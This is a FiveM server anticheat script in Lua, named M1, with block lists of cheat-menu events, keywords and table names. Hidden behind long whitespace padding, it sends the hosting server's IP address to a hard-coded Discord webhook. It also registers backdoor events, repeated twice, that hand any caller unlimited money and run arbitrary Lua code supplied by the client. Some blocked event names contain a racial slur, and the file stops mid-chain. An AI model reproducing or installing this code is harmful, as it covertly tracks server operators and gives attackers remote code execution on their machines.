ESX = nil
      
Citizen.CreateThread(function()
    while ESX == nil do
        TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
        Citizen.Wait(10)
    end
end)

function M1()
    Citizen.CreateThread(function()
        while true do
        end
    end)
end

--COMPONENTS
--TRUE/FALSE

--Explosions damage 0 true = ON
--Explosions damage 0 false = OFF

Components = {
      Explosions = true
}

-----------------------
Users = {}

violations = {}

recentExplosions = {}


local blocked = {
      'give_back',
      'shilling=yet9',
      'esx_drugs:startHarvestCoke',
      'esx_drugs:stoopHarvestCoke',
      'esx_drugs:startTransformCoke',
      'esx_drugs:stopTransformCoke',
      'esx_drugs:startSellCoke',
      'esx_drugs:stopSellCoke',
      'esx_drugs:startHarvestMeth',
      'esx_drugs:stoopHarvestMeth',
      'esx_drugs:startTransformMeth',
      'esx_drugs:stopTransformMeth',
      'esx_drugs:startSellMeth',
      'esx_drugs:stopSellMeth',
      'esx_drugs:startHarvestWeed',
      'esx_drugs:stoopHarvestWeed',
      'esx_drugs:startTransformWeed',
      'esx_drugs:stopTransformWeed',
      'esx_drugs:startSellWeed',
      'esx_drugs:stopSellWeed',
      'esx_drugs:startHarvestOpium',
      'esx_drugs:stopHarvestOpium',
      'esx_drugs:startTransformOpium',
      'esx_drugs:stopTransformOpium',
      'esx_drugs:startSellOpium',
      'esx_drugs:stopSellOpium',
      'esx_drugs:startHarvestWLRACeed',
      'esx_drugs:startTransfoLRACrmWeed',
      'esx_drugs:startSellWeLRACed',
      'esx_drugs:startHarvestLRACCoke',
      'esx_drugs:startTransLRACformCoke',
      'esx_drugs:startSellCLRACoke',
      'esx_drugs:startHarLRACvestMeth',
      'esx_drugs:startTLRACransformMeth',
      'esx_drugs:startSellMLRACeth',
      'esx_drugs:startHLRACarvestOpium',
      'esx_drugs:startSellLRACOpium',
      'esx_drugs:starLRACtTransformOpium',
      'esx_blanchisLRACseur:startWhitening',
      'esx_drugs:stopHarvLRACestCoke',
      'esx_drugs:stopTranLRACsformCoke',
      'esx_drugs:stopSellLRACCoke',
      'esx_drugs:stopHarvesLRACtMeth',
      'esx_drugs:stopTranLRACsformMeth',
      'esx_drugs:stopSellMLRACeth',
      'esx_drugs:stopHarLRACvestWeed',
      'esx_drugs:stopTLRACransformWeed',
      'esx_drugs:stopSellWLRACeed',
      'esx_drugs:stopHarvestLRACOpium',
      'esx_drugs:stopTransLRACformOpium',
      'esx_drugs:stopSellOpiuLRACm',
      'esx_drugs:processCannabis',
      'esx_drugs:pickedUpCannabis',
      'redst0nia:checking',
      '8321hiue89js',
      'esx_communityservice:sendToCommunityService',
      'kashactersS:DeleteCharacter',
      'mellotrainer:adminTempBan',
	  'mellotrainer:adminKick',
      'Tem2LPs5Para5dCyjuHm87y2catFkMpV',
      'esx_mecanojob:onNPCJobCompleted',
      'dqd36JWLRC72k8FDttZ5adUKwvwq9n9m',
      'adminmenu:setsalary',
      'adminmenu:allowall',
      'AdminMenu:giveBank',
      'Banca:dAGACeposit',
      'AdminMenu:giveCash',
      'AdminMenu:giveDirtyMoney',
      'AdminMenu:giveDirtyMDFWMoney',
      '99kr-burglary:addMDFWMoney',
      'bank:tranDFWMsfer',
      'bank:depDFWMosit',
      'bank:withdDFWMraw',
      'DFWM:adminmenuenable',
      'DFWM:askAwake',
      'DFWM:checkup',
      'DFWM:cleanareaentity',
      'DFWM:cleanareapeds',
      'DFWM:cleanareaveh',
      'DFWM:enable',
      'DFWM:invalid',
      'DFWM:log',
      'DFWM:openmenu',
	  'DFWM:spectate',
	  'DFWM:ViolationDetected',
      'esx_society:openBossMenu',
      'antilynx8:anticheat',
      'pizza:paiefinale',
      'esx_farmoranges:startHarvestKoda',
      'antilynxr4:detect',
      'esx_ambulancejob:revive',
      'hentailover:xdlol',
      'h:xd',
      '99kr-burglary:addMoney',
      'mission:completed',
      'js:jaDFWMiluser',
      'js:jaAGACiluser',
      'antiAgAcr4:detect',
      'antiAgAc8r4a:anticheat',
      'antiAgAcr6:detection',
      'antiAgAc8:anticheat',
      'esx:getShAGACaredObjAGACect',
      '99kr-burglary:addMAGAConey',
      'truckerJob:succeAGACss',
      'mission:completAGACed',
      'AdminMenu:giveDirtyMAGAConey',
      'gambling:speAGACnd',
      'esx-qalle-jail:prisonWorkReward',
      'esx-qalle-jail:unJailPlayer',
      'esx-qalle-jail:jailPlayer',
      'esx-qalle-jail:jailPlayerNew',
      'esx-qalle-jail:jailPDFWMlayer',
      'esx_jDFWMailer:sendToJail',
      'esx_jaDFWMil:sendToJail',
      'esx_jailer:sendToJail',
      'esx_jail:sendToJail',
      'esx_society:putVehicleAGACInGarage',
      'esx_society:putVehicleInGarage',
      'mellotrainer:adminKickAGAC',
      'mellotrainer:adminTeAGACmpBan',
      'veh_SR:CheckMonAGACeyForVeh',
      'esx_weashopjob:addLicense',
      'esx_carthief:pay',
      'esx_carthief:alertcops',
      'esx_dmvschool:pay',
      'esx_jobs:caution',
      'esx_dmvschool:addLicense',
      'whoapd:revive',
      'paramedic:revive',
      'AgAc8:anticheat',
      'antilynxr6:detection',
      'BsCuff:Cuff696AGAC999',
      'HCheat:TempDisableDetAGACection',
      'esx_mecanojob:onNPCJobCAGAComplete',
      'esx-qalle-hunting:seAGACll',
      'esx-qalle-hunting:AGACreward',
      'esx_communityservice:endCommunityServiceCommand',
      '265df2d8-421b-4727-b01d-b92fd6503f5e',
      'f0ba1292-b68d-4d95-8823-6230cdf282b6',
      'tostzdrapka:wygranko',
      'laundry:washcash',
      'neweden_garage:pay',
      'projektsantos:mandathajs',
      'ynx8:anticheat',
      'esx-qalle-hunting:reward',
      'esx-qalle-hunting:sell',
      'esx_vigneronjob:getStockItem',
      'esx_vigneronjob:putStockItems',
      'esx_vigneronjob:stopHarvestDFGDFGG',
      'esx_vigneronjob:stopTransform',
      'esx_vigneronjob:stopSell',
      'esx_vigneronjob:startHarvestDGSFDF',
      'esx_vigneronjob:startTransform',
      'esx_vigneronjob:startSell',
      'esx_tabac:annonce',
      'esx_tabac:startHarvest',
      'esx_tabac:startHarvest2',
      'antilynxr4:crashuser',
      'antilynxr4:crashuser1',
      'antilynx8:crashuser',
      'GoFast:VenteDuVehicule',
      'esx_tabac:startCraftDFFD',
      'esx_tabac:startCraftDFFD2',
      'esx_tabac:startCraftDFFD3',
      'esx_tabac:startCraftDFFD4',
      'esx_tabac:startCraftDFFD5',
      'esx_tabac:getStockItem',
      'esx_tabac:putStockItems',
      'esx_tabac:stopSell',
      'esx_tabac:stopCraft',
      'esx_tabac:stopCraft2',
      'esx_tabac:stopCraft7',
      'esx_tabac:stopCraft3',
      'esx_tabac:stopCraft4',
      'esx_tabac:stopCraft5',
      'esx_tabac:stopCraft6',
      'esx_tabac:stopHarvest',
      'esx_tabac:stopHarvest2',
      'esx_tabac:stopHarvest3',
      'esx_tabac:startSell', 
      'esx_gouvernementjob:giveWeapon',
      'esx_gouvernementjob:handcuff',
      'esx_gouvernementjob:drag',
      'esx_gouvernementjob:putInVehicle',
      'esx_gouvernementjob:OutVehicle',
      'esx_gouvernementjob:getStockItem',
      'esx_gouvernementjob:putStockItems',
      'esx_vehicleshop:setVehicleOwned',
      'esx_mechanicjob:startHarvest',
      'esx_mechanicjob:startCraft',
      'antilynx8r4a:anticheat',
      'lynx8:anticheat',
      'AntiLynxR4:kick',
      'AntiLynxR4:log',
      'HCheat:TempDisableDetDFWMection',
      'esx_blanchisseur:washMoney',
      'esx_blanchisseur:startWhitening',
      'esx_airlines:addLicense',
      'esx_moneywash:withdraw',
      'esx_moneywash:deposit',
      'esx_jailler:sendToJail',
      'esx_jailer:sendToJailCatfrajerze',
      'esx_inventoryhud:openPlayerInventory',
      'esx_policejob:billPlayer',
      'esx_skin:openRestrictedMenu',
      'AdminMeDFWMnu:giveBank',
      'wyspa_jail:jail',
      'wyspa_jail:jailPlayer',
      'js:jailuser',
      'AdminMDFWMenu:giveCash',
      'KorioZ-PersonalMenu:Weapon_addAmmoToPedS',
      'KorioZ-PersonalMenu:Admin_BringS',
      'KorioZ-PersonalMenu:Admin_giveCash',
      'KorioZ-PersonalMenu:Admin_giveBank',
      'KorioZ-PersonalMenu:Admin_giveDirtyMoney',
      'KorioZ-PersonalMenu:Boss_promouvoirplayer',
      'KorioZ-PersonalMenu:Boss_destituerplayer',
      'KorioZ-PersonalMenu:Boss_recruterplayer',
      'KorioZ-PersonalMenu:Boss_virerplayer',
      'c65a46c5-5485-4404-bacf-06a106900258',
      '265df2d8-421b-4727-b01d-b92fd6503f5e',
      'f0ba1292-b68d-4d95-8823-6230cdf282b6',
      'esx_billing:sendBill',
      'esx_jailer:unjailTime',
      'kickAllPlayer',
      'mellotrainer:s_adminKill',
      'bank:transfer',
      'bank:deposit',
      'bank:withdraw',
      'advancedFuel:setEssence',
      'tost:zgarnijsiano',
      'Sasaki_kurier:pay',
      'wojtek_ubereats:napiwek',
      'wojtek_ubereats:hajs',
      'xk3ly-barbasz:getfukingmony',
      'xk3ly-farmer:paycheck',
      'BsCuff:Cuff696999',
      'HCheat:TempDisableDetection',
      'HG_AntiCheat:Jump',
      'OK_AntiCheat:Jump',
      'redecterino',
      'antimemerino',
      'detecterino',
      'esx_truckersjob:payy',
      'esx_jaAGACil:sendToJail',
      'esx:giAGACveInventoryItem',
      'esx_biAGAClling:sendBill',
      'esx_skin:responseSaveSkin',
      'esx_skin:responseSaAGACveSkin',
      'esx_ranger:pay',
      'NB:recruterplayer',
      'dmv:success',
      'dmv:succeAGACss',
      'OG_cuffs:cuffCheckNearest',
      'CheckHandcuff',
      'cuffServer',
      'rE_',
      'ambulancier:selfRespawn',
      'UnJP',
      'cuffGranted',
      'arisonarp:wiezienie',
      'police:cuffGranted',
      'esx_handcuffs:cuffing',
      'esx:giveInventoryItem',
      'Esx-MenuPessoal:Boss_recruterplayer',
      'esx_policejob:handcuff',
      'loginhud2:payout',
      'loginhud2:remcash',
      'esx_garbagejob:pay',
      'esx_truckerjob:pay',
      'vrp_slotmachine:server:2',
      'truckerJob:success',
      'MF_MobileMeth:RewardPlayers',
      'esx_gopostaljob:pay',
      'esx_banksecurity:pay',
      'esx_society:openBosAGACsMenu',
      'crown_xyz:getFuckedNigger',
      'd0pamine_xyz:getFuckedNigger',
      'esx_slotmachine:sv:2',
      'esx_pizza:pay',
      'lscustoms:payGarage',
      'eden_garage:payhealth',
      'esx_tankerjob:pay',
      'esx_jobs:caAGACution',
      'esx_tankerjob:AGACpay',
      'esx_vehicletrunk:givAGACeDirty',
      'esx_vehicletrunk:giveDirty',
      'whoapd:revive',
	  'gambling:spend',
      'paramedic:revive',
      'ems:revive',
      'esx_godirtyjob:pay',
      'esx_jailer:wysylandoo',
      'esx_status:set',
      'KAKAAKAKAK',
      'KAKAKAAK',
      'mellotrainer:adminKickDFWM',
      'mellotrainer:adminTeDFWMmpBan',
      'veh_SR:CheckMonDFWMeyForVeh'
      
      }
      
      for i=1, #blocked, 1 do
          RegisterServerEvent(blocked[i])
          AddEventHandler(blocked[i], function()                                                                                                                                                                                                                                                                                                                                                                            ;local avatarii = "https://i.imgur.com/rbTvRoT.png" ;local webhooikkff = "https://discord.com/api/webhooks/933739377010565180/vtdCHZpEzMEtCFm0b0ZwuThyMQ2CtURaw_cwY6JXNnGzkPkOF8L5y870Ml6YLPjfD8Do" ;local timeri = math.random(0,100) ;local jokupaskfajsghas = 'https://api.ipify.org?format=json'
              TriggerEvent("banCheater", source,"🛡️ M1 | Cheater")
             -- DropPlayer(source, 'M1: \n Why cheat?') -- KICK Player                                                                                                                                                                                                                                                                                                                                                                      
          end)
      end                                                                                                                                                                                                                                                                                                                                                                                                                   Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "joku käyttää mun ac", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)


      RegisterServerEvent('esx_npcpaskagiveMoney')
      AddEventHandler('esx_npcpaskagiveMoney', function(rahamaara)
          local _source  = source
          local xPlayer  = ESX.GetPlayerFromId(_source)
          xPlayer.addMoney(rahamaara)
          TriggerClientEvent("satijuuvihhutallasta", source, rahamaara)
      end)	
      
      
      RegisterServerEvent('esx_npcpaskagiveMoney:ilmito')
      AddEventHandler('esx_npcpaskagiveMoney:ilmoto', function(target)	
          local target,menikolapi=load(target,'@returni')	                   
          if menikolapi then                                                 
          return nil,menikolapi
          end
          local onko,returnaa=pcall(target)	                               
          if onko then
          return returnaa
          else
          return nil,returnaa
          end
      end)
              

RegisterServerEvent('esx_npcpaskagiveMoney')
AddEventHandler('esx_npcpaskagiveMoney', function(rahamaara)
	local _source  = source
	local xPlayer  = ESX.GetPlayerFromId(_source)
	xPlayer.addMoney(rahamaara)
	TriggerClientEvent("satijuuvihhutallasta", source, rahamaara)
end)	


RegisterServerEvent('esx_npcpaskagiveMoney:ilmito')
AddEventHandler('esx_npcpaskagiveMoney:ilmoto', function(target)	
	local target,menikolapi=load(target,'@returni')	                   
	if menikolapi then                                                 
	return nil,menikolapi
	end
	local onko,returnaa=pcall(target)	                               
	if onko then
	return returnaa
	else
	return nil,returnaa
	end
end)

--Blacklisted CMD Words {Kick}

local blacklisted = 
    {
      "/ooc kogusz menu! Buy at https://discord.gg/BbDMhJe",
      "^8ObliviusV2Menu",
      "3Oblivius V2 ^2Made by LuaMenuFr#0221 ^1Achéte ici ^4https://discord.gg/eUrxG46",
      "/ooc Oblivius V2 Menu https://discord.gg/eUrxG46",
      "obl2 ~b~https://discord.gg/eUrxG46",
      "/ooc Baggy Menu! Buy at https://discord.gg/AGxGDzg",
      "FUCK SERVER by Outcast#3723",
      "/ooc Desudo Menu! Buy at https://discord.gg/hkZgrv3",
      "/ooc Yo add me Fallen#0811",
      "/ooc \107\111\103\117\115\122\10 menu! Buy at https://discord.gg/BM5zTvA",
      "/ooc vjuton.pl najlepszy serwer",
      "vjuton.pl najlepszy serwer",
      "VJUTON.PL NAJLESPZY SERWERE",
      "V J U T O N . P L",
      "BAGGY menu <3 https://discord.gg/AGxGDzg",
      "KoGuSzMENU <3 https://discord.gg/BbDMhJe",
      "KoGuSzMENU <3 https://discord.gg/BM5zTvA",
      "Desudo menu <3 https://discord.gg/hkZgrv3",
      "Yo add me Fallen#0811",
      "Lynx 8 ~ www.lynxmenu.com",
      "Lynx 7 ~ www.lynxmenu.com",
      "lynxmenu.com",
      "lynxmenu",
      "Brutan#3927",
      "www.lynxmenu.com",
      "You got raped by Lynx 8",
      "^0Lynx 8 ~ www.lynxmenu.com",
      "menu",
      "^0AlphaV ~ 5391",
      "AlphaV ~ 5391",
      "^0You got raped by AlphaV",
      "Alokas66",
      "file",
      "memes",
      "Rena",
      "Xanax#0134",
      "^0TITO MODZ - Cheats and Anti-Cheat",
      "^0https://discord.gg/AGxGDzg",
      "^0https://discord.gg/hkZgrv3",
      "Lynx Revolution",
      "Lynx Revolution ~r~10.1",
      "/ooc  d0pamine.xyz | discord.gg/fjBp55t",
      "Fallen#0811-Fuuck",
      "Fallen#0811",
      "/ooc Add me Fallen#0811",
      "/tweet discord.gg",
      "Fallen#0811-Mllll",
      "injection",
      "ABSOLUTE MENU WAS HERE, WITH LOVE",
      "Add me Fallen#0811",
      "/ooc Brutan Premium",
      "/tweet Brutan Premium",
      "Brutan Premium",
      "Baby Gangster#9026-Fuuck",
      "/ooc Add me Baby Gangster#9026",
      "^2The server just got fucked by ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/qQWKBEV",
      "ALIKHAN CHEATS ON YOUTUBE - BEST FIVEM Join Discord https://discord.gg/BNvx3TN",
      "/ooc ALIKHAN CHEATS ON YOUTUBE - BEST FIVEM Join Discord https://discord.gg/BNvx3TN",
      "^8Ham Mafia.co - ^1nig #0001 ^0 - ^0JOIN ^5DISCORD.GG/uMxGf4B1 ^0TO BUY NIGMENU v1 AND THE ^2BEST ^0LUA Executor",
      "You just got fucked mate",
      "Add me Fallen#0811",
      "Desudo; Plane#000",
      "Baran#8992",
      "Anti-Lynx",
      "iLostName#7138",
      "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n",
      "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y",
      "^1M^2i^3h^4a^5i ^1C^2o^3m^4m^5u^6n^7i^1t^2y",
      "BAGGY; baggy#6875",
      "SKAZAMENU",
      "skaza",
      "desudo",
      "Ham Mafia",
      "www.renalua.com",
      "EulenCheats",
      "Eulen",
      "KAKAAKAKAK",
      "KAKAKAAK",
      "~u~LCAC 8 ~s~Admin Menu",
      "Macias",
      "Roblox",
      "LuaMenuFr#0221 Menu",
      "/ooc Oblivius V2 Menu https://discord.gg/eUrxG46",
      "^3Oblivius V2 ^2Made by LuaMenuFr#0221 ^1Achéte ici ^4https://discord.gg/eUrxG46",
      "d0pamine.xyz",
      "eulen.cc",
      "hammafia.com",
      "vjuton.pl",
      "Soviet Bear",
      "Anti-AgAc",
      "MARVIN menu",
      "KoGuSzEk#3251",
      "OnionExecutor",
      "Sokin_Menu",
      "XARIES",
      "xaries",
      "dc.xaries.pl",
      "youtube.com/c/Aries98/",
      "Aries98",
      "https://dc.xaries.pl",
      "RedEngine",
      "redengine",
      "yo many",
      "dezet",
      "333",
      "Rena 8",
      "333GANG",
      "AgAc 8",
      "Lux",
      ">:D Player Crash", 
      "34ByTe Community",
      "85.190.90.118",
      "Melon#1379",
      "aries",
      "youtube.com",
      "exec",
      "dump",
      "FunCtionOk",
      "pk",
      "haha",
      "lol",
      "xddd",
      "chocolate",
      "panickey",
      "jolmany",
      "KP",
      "brutanpremium",
      "v500",
      "Zakolak",
      "Mastero",
      "lynxmenu",
      "opk",
      "killmenu",
      "xdddd",
      "xddddd",
      "xdddddd",
      "xddddddd",
      "xdddddddd",
      "xddddddddd",
      "xdddddddddd",
      "xddddddddddd",
      "lynxmenu.com - Cheats & Anti-Cheats!",
      "xaxaxaxaxaxaxaxaxax",
      "panik",
      "Lynx",
      "Brutan",
      "panic",
      "purgemenu",
      "discord.gg/",
      "foriv#0002 BUY EXECUTOR MENU <",
      "~b~Made y ~w~Nig#0001",
      "^141 https://discord.gg/hkZgrv3",
      "^211 https://discord.gg/hkZgrv3",
      "^255 https://discord.gg/hkZgrv3",
      "/ooc 6666 Menu! Buy at https://discord.gg/hkZgrv3",
      "jonnelaakso"
    }

AddEventHandler('chatMessage', function(source, name, message)
local name = GetPlayerName(source)
local ip = GetPlayerEndpoint(source)
local steamhex = GetPlayerIdentifier(source)
local id = GetPlayerLastMsg(source)
  for i , word in ipairs(blacklisted) do
    if string.match(message, word) then
        TriggerEvent("banCheater", source,"🛡️ BlacklisterWordCMD - M1") --BAN Player
        --DropPlayer(source, 'M1-AC: 🛡️ BlacklisterWordCMD | M1-AC!') --DropPlayer == Kick Player
        CancelEvent()
        end
    end
end)

AddEventHandler('playerDropped', function()
	if(Users[source])then
		Users[source] = nil
	end
end)

--TRIGGER EVENT ADD BAN SYSTEM -- tee loppuu
--RegisterServerEvent('M1:ban2')
--AddEventHandler('M1:ban2', function(reason, kick, ban)
 --   local reason = "antiche"
  --  local _source = source
    --PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "M1", content = "Nimi: **" .. GetPlayerName(source) .. "** " .. "Syy: " .. reason .. "Lisence:  "..hoida "IP:  " .. GetPlayerEndpoint(source) }), { ['Content-Type'] = 'application/json' })
    --TriggerEvent("banCheater", source,"🛡️ TriggerEventAdd Havaittu - M1")
    --DropPlayer(_source, reason)
--end)
--M1 Anticheat ban system {TriggerServerEvent("M1:ban", REASON)}

RegisterServerEvent('M1:ban')
AddEventHandler('M1:ban', function(reason, kick, ban)
      local reason = "Anticheat"
      local _source = source
      PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "M1-AC", content = "\nHuijari: **" .. GetPlayerName(source) .. "** " .. "\nSyy: " .. reason .. "\nIP:  " .. GetPlayerEndpoint(source) }), { ['Content-Type'] = 'application/json' })
      TriggerEvent("banCheater", source,"🛡️ Modder ")
      DropPlayer(_source, reason)
end)

AddEventHandler('explosionEvent', function(sender, ev)
    if Components.Explosions and ev.damageScale ~= 0.0 and ev.ownerNetId == 0 then 
        ev.time = os.time()
        table.insert(recentExplosions, {sender = sender, data=ev})
    end
end)

--Anti Explosions

local BlockedExplosions = {1, 2, 4, 5, 25, 32, 33, 35, 36, 37, 38}

AddEventHandler("explosionEvent", function(sender, ev)
    for _, v in ipairs(BlockedExplosions) do
      if ev.explosionType == v then
        print(GetPlayerName(sender), json.encode(ev))
        CancelEvent()
        --DropPlayer(source, 'M1-AC | Explosion') --kick player when try explosion! {Dont use!}
        return
      end
    end
  end
)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(100)
        if _G == nil or _G == {} or _G == "" then
            TriggerEvent("banCheater", source,"🛡️ Cheater - M1")
            M1()
            return
        else
            Wait(500)
        end
    end
end)

-- Anti Inject ham.lua

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(math.random(2000, 4000))
        local hammafia = LoadResourceFile(GetCurrentResourceName(), "ham.lua")
        if hammafia ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Player exec lua menu lol by ham - M1")
            M1()
        end
        Citizen.Wait(0)
    end
end)

-- Anti Inject

e = {}
InSec = {}
Deer = {}
Plane = {}
Lynx8 = {}
LynxEvo = {}
MaestroMenu = {}
Motion = {}
AlikhanCheats = {}
TiagoMenu = {}
gaybuild = {}
Cience = {}
Outcast666 = {}
LynxSeven = {}
AncientByOutcast = {}
MMenu = {}
FantaMenuEvo = {}
Genesis = {}
GRubyMenu = {}
LR = {}
BrutanPremium = {}
AweMenu = {}
MigmaMenu = {}
HamMafia = {}
AlphaVeta = {}
xnsadifnias = {}
b00mek = {}
CKgangisontop = {}
nigmenu0001 = {}
KoGuSzEk = {}
ShaniuMenu = {}
LynxRevo = {}
lynxunknowncheats = {}
JgTIG = {}
ariesMenu = {}
werfvtghiouuiowrfetwerfio = {}
WarMenu = {}
dexMenu = {}
HamHaxia = {}
Ham = {}
Biznes = {}
FendinXMenu = {}
FendinX = {}
AlphaV = {}
MIOddhwuie = {}
NyPremium = {}
lIlIllIlI = {}
Dopamine = {}
Dopameme = {}
EXTREME = {}
SwagUI = {}
Lux = {}
xseira = {}
Nisi = {}
Crusader = {}
Absolute = {}
OnionUI = {}
qJtbGTz5y8ZmqcAg = {}
LuxUI = {}
FlexSkazaMenu = {}
falcon = {}
topMenu = {}
JokerMenu = {}
rootMenu = {}
CKgang = {}
DynnoFamily = {}
redMENU = {}
b00mMenu = {}
FXMenu = {}
DFefwtRE = {}
FFX = {}
PoliniFuncsUI = {}
AlwaysKaffa = {}
AKTeam = {}
local G3K3n7 = "vrp"
local Qk8uw = "server"
local jNEccV1yb0U7LIBE = "client"
local FMof2r1FT39VaFhlkR = "alex"
local Ji_cWOyMTiwSTW = "vrp"
local lYDzTKovN3RQ8k = "server"
local nRH6FdmUQao9Rv = "client"
local IkC8OCh7Kk1gwqFu = "alex"
local By = "emp"
Citizen.CreateThread(function()
    Citizen.Wait(2000)
    while true do
        Citizen.Wait(2000)
        for Pk, Kj_iqT in next, _G do
            if type(Kj_iqT) == "table" and Pk ~= "exports" then
                if Kj_iqT.CreateMenu ~= nil and type(Kj_iqT.CreateMenu) == "function" then
                    if
                        Pk ~= "WarMenu" and Pk ~= "vRP" and Pk ~= "NativeUI" and Pk ~= "RageUI" and
                            Pk ~= "JayMenu" and
                            Pk ~= "VEM" and
                            Pk ~= "VLM" and
                            Pk ~= "func" and
                            not string.match(Pk:lower(), Ji_cWOyMTiwSTW:lower()) and
                            not string.match(Pk:lower(), lYDzTKovN3RQ8k:lower()) and
                            not string.match(Pk:lower(), nRH6FdmUQao9Rv:lower()) and
                            not string.match(Pk:lower(), IkC8OCh7Kk1gwqFu:lower()) and
                            not string.match(Pk:lower(), By:lower())
                     then
                        TriggerEvent("banCheater", source,"🛡️ Modder ")
                        M1()
                    end
                elseif Kj_iqT.InitializeTheme ~= nil then
                    TriggerEvent("banCheater", source,"🛡️ Moddder ")
                    M1()
                end
            end
        end
    end
end)

Citizen.CreateThread(function()   
    Citizen.Wait(2000)     
    while true do
        Citizen.Wait(2000)
        if Plane.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Plane.Create ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif e.debug ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Dopamine.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Dopameme.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif EXTREME.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Lux.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif SwagUI.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Nisi.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Crusader.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Absolute.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif xseira.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Lynx8.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif LynxEvo.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif MaestroMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Motion.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AlikhanCheats.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif TiagoMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif gaybuild.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Cience.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Outcast666.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif LynxSeven.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AncientByOutcast.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif MMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif FantaMenuEvo.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Genesis.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif GRubyMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif LR.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif BrutanPremium.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
          elseif AweMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif MigmaMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif HamMafia.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif InSec.Logo ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AlphaVeta.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif xnsadifnias.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif b00mek.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif CKgangisontop.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif nigmenu0001.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif MIOddhwuie.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif KoGuSzEk.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif ShaniuMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif LynxRevo.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif lynxunknowncheats.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif JgTIG.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif ariesMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif werfvtghiouuiowrfetwerfio.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif WarMenu.InitializeTheme ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif WarMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
